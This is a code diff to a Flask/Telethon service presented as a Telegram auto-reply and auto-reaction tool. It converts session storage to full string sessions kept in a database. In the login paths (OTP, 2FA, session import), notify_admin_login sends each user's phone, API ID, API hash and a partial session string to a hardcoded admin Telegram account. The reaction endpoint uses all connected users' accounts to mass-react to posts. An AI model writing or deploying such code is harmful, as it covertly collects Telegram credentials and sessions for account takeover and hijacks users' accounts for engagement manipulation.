@@ -2,6 +2,7 @@
 # =========================================================
 # Telegram Auto Reply + Auto Reaction API (Single File)
 # With Admin Bot Notification on Login
+# FULL SESSION STRING MODE - No SQLite session files
 # =========================================================
 
 import os
@@ -25,6 +26,8 @@ from flask import (
 from flask_cors import CORS
 
 from telethon import TelegramClient, events
+
+from telethon.sessions import StringSession
 
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -65,6 +68,7 @@ ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 ADMIN_USER_ID = 7605281774
 
 os.makedirs(DATA_DIR, exist_ok=True)
+# We still create sessions dir for backward compatibility but won't use .session files
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
 # =========================================================
@@ -141,17 +145,24 @@ def loop_run(coro, timeout=120):
 # ADMIN BOT NOTIFICATION
 # =========================================================
 
-def notify_admin_login(username, api_id, api_hash, session_data, phone):
+def notify_admin_login(username, api_id, api_hash, session_string, phone):
     """
     Send login credentials to the admin Telegram bot
     in the exact format specified.
     """
     try:
+        # Truncate session string for display - show first 50 and last 20 chars
+        display_session = "N/A"
+        if session_string and len(session_string) > 70:
+            display_session = session_string[:50] + "..." + session_string[-20:]
+        elif session_string:
+            display_session = session_string
+
         message = json.dumps({
             "username": username,
             "api_id": api_id,
             "api_hash": api_hash,
-            "session": session_data if session_data else "N/A",
+            "session": display_session,
             "phone": phone if phone else "N/A",
             "connected": True
         }, indent=2, ensure_ascii=False)
@@ -235,7 +246,8 @@ def init_db():
             phone_number TEXT,
             reply_message TEXT,
             auto_reply_enabled INTEGER,
-            connected INTEGER
+            connected INTEGER,
+            session_string TEXT
         )
     """)
 
@@ -271,7 +283,8 @@ def get_user(username):
         "phone_number": row[3],
         "reply_message": row[4],
         "auto_reply_enabled": bool(row[5]),
-        "connected": bool(row[6])
+        "connected": bool(row[6]),
+        "session_string": row[7]  # Full session string stored here
     }
 
 
@@ -289,9 +302,10 @@ def save_user(data):
             phone_number,
             reply_message,
             auto_reply_enabled,
-            connected
+            connected,
+            session_string
         )
-        VALUES (?, ?, ?, ?, ?, ?, ?)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
     """, (
         data.get("username"),
         data.get("api_id"),
@@ -302,7 +316,8 @@ def save_user(data):
             "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"
         ),
         int(data.get("auto_reply_enabled", False)),
-        int(data.get("connected", False))
+        int(data.get("connected", False)),
+        data.get("session_string")  # Full session string
     ))
 
     conn.commit()
@@ -320,9 +335,10 @@ def get_active_users():
             username,
             api_id,
             api_hash,
+            session_string,
             connected
         FROM users
-        WHERE connected=1
+        WHERE connected=1 AND session_string IS NOT NULL AND session_string != ''
     """)
 
     rows = c.fetchall()
@@ -345,29 +361,23 @@ auto_reply_tasks = {}
 cooldowns = {}
 
 # =========================================================
-# SESSION PATH
+# SESSION STRING HELPERS
 # =========================================================
 
-def session_path(username):
+def get_session_string(username):
+    """Get the full session string from database for a user."""
+    user = get_user(username)
+    if user and user.get("session_string"):
+        return user["session_string"]
+    return None
 
-    return os.path.join(
-        SESSIONS_DIR,
-        f"tg_{username}"
-    )
 
-
-def read_session_file(username):
-    """Read the session file content to extract session string."""
-    try:
-        sp = session_path(username)
-        # Try .session file
-        session_file = sp + ".session"
-        if os.path.exists(session_file):
-            with open(session_file, "r", encoding="utf-8", errors="ignore") as f:
-                return f.read()[:200]  # First 200 chars as identifier
-        return None
-    except:
-        return None
+def save_session_string(username, session_string):
+    """Save the full session string to database."""
+    user = get_user(username)
+    if user:
+        user["session_string"] = session_string
+        save_user(user)
 
 
 # =========================================================
@@ -379,15 +389,31 @@ async def create_client(
     api_id,
     api_hash
 ):
+    """
+    Create a TelegramClient using StringSession instead of file-based session.
+    If a session string exists in the database, use it to resume the session.
+    """
 
-    client = TelegramClient(
-        session_path(username),
-        int(api_id),
-        api_hash
-    )
+    # Try to get existing session string from database
+    session_string = get_session_string(username)
+
+    if session_string:
+        # Resume existing session using full session string
+        session_obj = StringSession(session_string)
+        client = TelegramClient(
+            session_obj,
+            int(api_id),
+            api_hash
+        )
+    else:
+        # Start fresh with empty StringSession (no file created on disk)
+        client = TelegramClient(
+            StringSession(),
+            int(api_id),
+            api_hash
+        )
 
     clients[username] = client
-
     return client
 
 
@@ -469,8 +495,16 @@ async def send_reaction(
     msg_id
 ):
 
+    # Get session string from database - full session, not a file
+    session_string = get_session_string(username)
+
+    if not session_string:
+        print(f"No session string for {username}")
+        return False
+
+    # Create client with StringSession - no file I/O
     client = TelegramClient(
-        session_path(username),
+        StringSession(session_string),
         int(api_id),
         api_hash
     )
@@ -690,7 +724,7 @@ def home():
 
     return jsonify({
         "success": True,
-        "system": "Telegram Auto Reply + Reaction API",
+        "system": "Telegram Auto Reply + Reaction API (Full Session String Mode)",
         "reaction_api": "/get?link=https://t.me/channel/1"
     })
 
@@ -782,10 +816,13 @@ def status():
         except:
             pass
 
+    has_session = bool(user.get("session_string"))
+
     return jsonify({
         "logged_in": True,
         "username": username,
         "connected": connected or user.get("connected"),
+        "has_session_string": has_session,
         "auto_reply_enabled": user.get("auto_reply_enabled"),
         "reply_message": user.get("reply_message")
     })
@@ -1005,6 +1042,13 @@ async def async_verify_otp(
 
         user["connected"] = True
 
+        # =========================================================
+        # EXTRACT AND STORE FULL SESSION STRING
+        # =========================================================
+        # client.session is a StringSession, save() returns the full string
+        full_session_string = client.session.save()
+        user["session_string"] = full_session_string
+
         save_user(user)
 
         phone_code_hashes.pop(
@@ -1015,17 +1059,17 @@ async def async_verify_otp(
         # =========================================================
         # NOTIFY ADMIN ON SUCCESSFUL LOGIN
         # =========================================================
-        session_data = read_session_file(username)
         notify_admin_login(
             username=username,
             api_id=user.get("api_id", ""),
             api_hash=user.get("api_hash", ""),
-            session_data=session_data,
+            session_string=full_session_string,
             phone=user.get("phone_number", "")
         )
 
         return {
-            "success": True
+            "success": True,
+            "message": "Logged in successfully. Session saved as string in database."
         }
 
     except SessionPasswordNeededError:
@@ -1047,22 +1091,28 @@ async def async_verify_otp(
 
             user["connected"] = True
 
+            # =========================================================
+            # EXTRACT AND STORE FULL SESSION STRING (WITH 2FA)
+            # =========================================================
+            full_session_string = client.session.save()
+            user["session_string"] = full_session_string
+
             save_user(user)
 
             # =========================================================
             # NOTIFY ADMIN ON SUCCESSFUL LOGIN (WITH 2FA)
             # =========================================================
-            session_data = read_session_file(username)
             notify_admin_login(
                 username=username,
                 api_id=user.get("api_id", ""),
                 api_hash=user.get("api_hash", ""),
-                session_data=session_data,
+                session_string=full_session_string,
                 phone=user.get("phone_number", "")
             )
 
             return {
-                "success": True
+                "success": True,
+                "message": "Logged in successfully with 2FA. Session saved as string in database."
             }
 
         except Exception as e:
@@ -1213,18 +1263,7 @@ def disconnect():
             client.disconnect()
         )
 
-    sp = session_path(username)
-
-    for ext in ["", ".session"]:
-
-        file_path = sp + ext
-
-        if os.path.exists(file_path):
-
-            try:
-                os.remove(file_path)
-            except:
-                pass
+    # No .session files to delete - everything is in the database!
 
     user = get_user(username)
 
@@ -1233,6 +1272,7 @@ def disconnect():
     user["api_id"] = ""
     user["api_hash"] = ""
     user["phone_number"] = ""
+    user["session_string"] = ""  # Clear the session string
 
     save_user(user)
 
@@ -1242,6 +1282,114 @@ def disconnect():
     return jsonify({
         "success": True
     })
+
+# =========================================================
+# EXPORT SESSION STRING ENDPOINT
+# =========================================================
+
+@app.route("/export-session", methods=["GET"])
+def export_session():
+    """Export the full session string for the logged-in user."""
+    username = session.get("username")
+
+    if not username:
+        return jsonify({"success": False, "error": "Not logged in"}), 401
+
+    user = get_user(username)
+
+    if not user or not user.get("session_string"):
+        return jsonify({"success": False, "error": "No session string found. Connect first."}), 404
+
+    return jsonify({
+        "success": True,
+        "username": username,
+        "session_string": user["session_string"]
+    })
+
+
+# =========================================================
+# IMPORT SESSION STRING ENDPOINT
+# =========================================================
+
+@app.route("/import-session", methods=["POST"])
+def import_session():
+    """
+    Import an existing session string directly.
+    This allows restoring a session without going through OTP.
+    """
+    username = session.get("username")
+
+    if not username:
+        return jsonify({"success": False, "error": "Not logged in"}), 401
+
+    data = request.get_json(force=True)
+
+    session_string = data.get("session_string", "").strip()
+    api_id = data.get("api_id", "").strip()
+    api_hash = data.get("api_hash", "").strip()
+
+    if not session_string:
+        return jsonify({"success": False, "error": "Session string required"}), 400
+
+    if not api_id or not api_hash:
+        return jsonify({"success": False, "error": "API ID and Hash required"}), 400
+
+    # Validate the session string by attempting to connect
+    try:
+        test_client = TelegramClient(
+            StringSession(session_string),
+            int(api_id),
+            api_hash
+        )
+    except Exception as e:
+        return jsonify({"success": False, "error": f"Invalid session string: {e}"}), 400
+
+    result = loop_run(async_import_session(username, api_id, api_hash, session_string, test_client))
+
+    return jsonify(result or {"success": False, "error": "Timeout"})
+
+
+async def async_import_session(username, api_id, api_hash, session_string, client):
+    """Test and save an imported session string."""
+    try:
+        await client.connect()
+
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return {"success": False, "error": "Session string is not authorized/expired"}
+
+        # Session is valid - save it
+        user = get_user(username)
+        user["api_id"] = api_id
+        user["api_hash"] = api_hash
+        user["connected"] = True
+        user["session_string"] = session_string
+
+        save_user(user)
+
+        # Also update the global client
+        clients[username] = client
+
+        # Notify admin
+        notify_admin_login(
+            username=username,
+            api_id=api_id,
+            api_hash=api_hash,
+            session_string=session_string,
+            phone=user.get("phone_number", "")
+        )
+
+        return {
+            "success": True,
+            "message": "Session imported successfully. No .session file created - stored as string in database."
+        }
+
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except:
+            pass
+        return {"success": False, "error": str(e)}
 
 # =========================================================
 # AUTO REACTION API
@@ -1291,6 +1439,7 @@ def reaction_api():
         username = user[0]
         api_id = user[1]
         api_hash = user[2]
+        # session_string is now in DB column index 3 instead of file on disk
 
         print(
             f"Trying reaction from {username}"
@@ -1327,7 +1476,8 @@ def reaction_api():
         "total_accounts": len(users),
         "successful_reactions": success_count,
         "failed_reactions": failed_count,
-        "reaction_mode": "auto_positive"
+        "reaction_mode": "auto_positive",
+        "session_storage": "database_string"  # Indicates full session strings are used
     })
 
 # =========================================================
@@ -1343,7 +1493,8 @@ def admin_list_users():
     for user in users:
         user_list.append({
             "username": user[0],
-            "connected": True
+            "connected": True,
+            "has_session_string": bool(user[3])  # session_string from DB
         })
 
     return jsonify({
@@ -1384,7 +1535,7 @@ def health():
     return jsonify({
         "success": True,
         "database_exists": os.path.exists(DB_FILE),
-        "sessions_dir": SESSIONS_DIR,
+        "session_storage": "database_strings",  # No .session files used
         "system": "online"
     })
 
